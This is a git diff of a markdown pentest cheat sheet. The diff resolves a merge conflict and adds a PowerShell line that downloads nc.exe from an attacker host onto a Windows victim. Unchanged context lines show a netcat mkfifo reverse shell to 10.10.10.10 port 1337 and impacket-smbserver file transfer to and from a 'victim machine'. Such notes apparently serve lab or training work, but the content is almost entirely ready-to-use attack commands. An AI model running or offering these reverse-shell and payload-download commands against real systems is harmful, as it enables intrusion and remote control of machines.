@@ -24,7 +24,6 @@ Probably the least-special-characters way (and with sh):
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1337 > /tmp/f
 ```
-<<<<<<< HEAD
 
 ### Windows
 Using impacket-smbserver we can copy files to and from the victim machine. Start the impacket-smbserver:
@@ -41,5 +40,8 @@ To copy files from Windows to Kali:
 ```cmd
 > copy file.ext \\<Kali IP>\leet\file.ext
 ```
-=======
->>>>>>> 0efa152bd1d9f18ec2a406fff9473fbdf9c8e604
+
+You can copy files from your Kali VM using powershell one-liner
+```cmd
+powershell Invoke-WebRequest -uri http://10.10.10.10/nc.exe -outfile C:\write\whever\nc.exe
+```
